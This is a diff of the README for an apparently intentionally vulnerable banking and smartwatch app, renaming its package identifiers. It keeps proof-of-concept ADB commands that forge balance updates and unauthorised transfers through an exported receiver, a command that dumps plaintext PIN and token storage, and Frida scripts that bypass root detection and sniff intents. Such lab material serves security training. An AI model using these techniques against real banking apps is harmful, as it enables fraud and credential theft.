@@ -159,19 +159,18 @@ Nexora Bank delivers an authentic dual-persona experience:
   ```xml
   <!-- VULNERABLE: Exported receiver without signature permission -->
   <receiver
-      android:name=".BluetoothSyncReceiver"
+      android:name=".BluetoothSyncModule"
       android:exported="true">
       <intent-filter>
-          <action android:name="com.vulnerablebankapp.BLUETOOTH_SYNC" />
+          <action android:name="com.nexorabank.omniwear.ACTION_BT_SYNC" />
       </intent-filter>
   </receiver>
   ```
 - **PoC Command via ADB**:
   ```bash
   adb -s emulator-5556 shell am broadcast \
-    -a com.vulnerablebankapp.BLUETOOTH_SYNC \
-    --es action "UPDATE_BALANCE" \
-    --ed amount 13370000.0
+    -a com.nexorabank.omniwear.ACTION_BT_SYNC \
+    --es sync_payload '{"action":"UPDATE_BALANCE","amount":13370000.0}'
   ```
   *Observed Result*: The smartwatch display immediately updates the liquid balance to `$13,370,000.00` without server confirmation.
 
@@ -185,9 +184,9 @@ Nexora Bank delivers an authentic dual-persona experience:
 - **PoC Command**:
   ```bash
   adb -s emulator-5556 shell am broadcast \
-    -a com.vulnerablebankapp.wear.ACTION_QUICK_PAY \
+    -a com.nexorabank.omniwear.ACTION_QUICK_PAY \
     --es recipient "ATTACKER_WALLET" \
-    --ed amount 50000.0
+    --ef amount 50000.0
   ```
   *Observed Result*: `$50,000.00` is debited and transferred to the attacker's wallet without prompt or consent.
 
@@ -213,11 +212,11 @@ Nexora Bank delivers an authentic dual-persona experience:
 - **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-312 (Cleartext Storage)
 - **Description**:
   The 4-digit Quick-PIN has only $10^4 = 10,000$ possible combinations. The watch application does not enforce exponential backoff or account wipe after consecutive failed attempts. Furthermore, the PIN and JWT tokens are stored in plaintext in the app sandbox:
-  `/data/data/com.vulnerablebankapp.wear/shared_prefs/`
+  `/data/data/com.nexorabank.omniwear/shared_prefs/`
 - **PoC Command**:
   ```bash
   # Dump credentials directly from debuggable sandbox
-  adb -s emulator-5556 shell "run-as com.vulnerablebankapp.wear cat shared_prefs/VulnerableBankPrefs.xml"
+  adb -s emulator-5556 shell "run-as com.nexorabank.omniwear cat shared_prefs/NexoraVaultPrefs.xml"
   ```
 
 ---
@@ -244,7 +243,7 @@ Nexora Bank delivers an authentic dual-persona experience:
 - **Frida Hook**:
   ```javascript
   Java.perform(function() {
-      var RootCheck = Java.use("com.vulnerablebankapp.security.RootChecker");
+      var RootCheck = Java.use("com.nexorabank.omniwear.SecurityCheckModule");
       RootCheck.isDeviceRooted.implementation = function() {
           console.log("[+] Bypassed Root Detection!");
           return false;
@@ -275,37 +274,46 @@ Nexora Bank delivers an authentic dual-persona experience:
 ### Quick ADB Test Execution
 ```bash
 # 1. Update Balance on Watch
-adb -s emulator-5556 shell am broadcast -a com.vulnerablebankapp.BLUETOOTH_SYNC --es action "UPDATE_BALANCE" --ed amount 77777.0
+adb -s emulator-5556 shell am broadcast -a com.nexorabank.omniwear.ACTION_BT_SYNC --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'
 
 # 2. Trigger High-Value 2FA Notification on Watch
-adb -s emulator-5556 shell am broadcast -a com.vulnerablebankapp.wear.TRIGGER_2FA --es action "PUSH_2FA" --ed amount 50000.0 --es merchant "SWIFT_OFFSHORE"
+adb -s emulator-5556 shell am broadcast -a com.nexorabank.omniwear.ACTION_TRIGGER_OTP --es otp "839201"
 
 # 3. Dump Sandbox Preferences
-adb -s emulator-5556 shell "run-as com.vulnerablebankapp.wear cat shared_prefs/VulnerableBankPrefs.xml"
+adb -s emulator-5556 shell "run-as com.nexorabank.omniwear cat shared_prefs/NexoraVaultPrefs.xml"
 ```
 
 ### Complete Frida Security Hook Script
 ```javascript
 // nexora_wear_bypass.js
 Java.perform(function() {
-    // 1. Bypass Root Checks
+    console.log("[*] Initializing Nexora Bank security hooks...");
+
+    // 1. Bypass Root & Emulator Checks
     try {
-        var RootUtil = Java.use("com.vulnerablebankapp.util.SecurityUtils");
-        RootUtil.isDeviceCompromised.implementation = function() {
+        var RootUtil = Java.use("com.nexorabank.omniwear.SecurityCheckModule");
+        RootUtil.isDeviceRooted.implementation = function() {
+            console.log("[✓] Root check bypassed!");
             return false;
         };
-    } catch(e) {}
+    } catch(e) {
+        console.log("[-] RootUtil hook failed: " + e);
+    }
 
     // 2. Sniff BLE Sync Packets
-    var Receiver = Java.use("com.vulnerablebankapp.BluetoothSyncReceiver");
-    Receiver.onReceive.implementation = function(context, intent) {
-        console.log("[🚨 SNIFFED BLE INTENT] Action: " + intent.getAction());
-        var extras = intent.getExtras();
-        if (extras) {
-            console.log("   Payload: " + extras.toString());
-        }
-        this.onReceive(context, intent);
-    };
+    try {
+        var Receiver = Java.use("com.nexorabank.omniwear.BluetoothSyncModule");
+        Receiver.onReceive.implementation = function(context, intent) {
+            console.log("[🚨 SNIFFED BLE INTENT] Action: " + intent.getAction());
+            var extras = intent.getExtras();
+            if (extras) {
+                console.log("   Payload: " + extras.toString());
+            }
+            this.onReceive(context, intent);
+        };
+    } catch(e) {
+        console.log("[-] Receiver hook failed: " + e);
+    }
 });
 ```
 
